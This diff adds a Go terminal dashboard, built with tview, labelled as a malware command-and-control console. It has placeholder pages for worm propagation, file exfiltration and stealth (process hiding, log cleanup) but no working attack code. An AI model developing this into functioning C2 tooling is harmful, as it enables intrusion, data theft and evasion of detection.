@@ -1,0 +1,37 @@
+package main
+
+import (
+    "fmt"
+    "github.com/rivo/tview"
+)
+
+func main() {
+    app := tview.NewApplication()
+    textView := tview.NewTextView().SetText("=== C2 Command and Control Dashboard ===")
+
+    // Layout with pages for each module
+    pages := tview.NewPages().
+        AddPage("Home", textView, true, true).
+        AddPage("Clients", tview.NewTextView().SetText("Client List and Status"), true, false).
+        AddPage("Propagation", tview.NewTextView().SetText("Worm and Lateral Movement"), true, false).
+        AddPage("Exfiltration", tview.NewTextView().SetText("File Collection Status"), true, false).
+        AddPage("Stealth", tview.NewTextView().SetText("Process Hiding and Log Cleanup"), true, false)
+
+    // Create sidebar menu for navigation
+    menu := tview.NewList().
+        AddItem("Home", "Dashboard Overview", 'h', func() { pages.SwitchToPage("Home") }).
+        AddItem("Clients", "View connected clients", 'c', func() { pages.SwitchToPage("Clients") }).
+        AddItem("Propagation", "Worm propagation and lateral movement", 'p', func() { pages.SwitchToPage("Propagation") }).
+        AddItem("Exfiltration", "Monitor exfiltrated files", 'e', func() { pages.SwitchToPage("Exfiltration") }).
+        AddItem("Stealth", "View stealth status", 's', func() { pages.SwitchToPage("Stealth") }).
+        AddItem("Quit", "Exit the application", 'q', func() { app.Stop() })
+
+    // Layout
+    layout := tview.NewFlex().
+        AddItem(menu, 0, 1, true).
+        AddItem(pages, 0, 4, false)
+
+    if err := app.SetRoot(layout, true).Run(); err != nil {
+        fmt.Printf("Error starting dashboard: %v\n", err)
+    }
+}
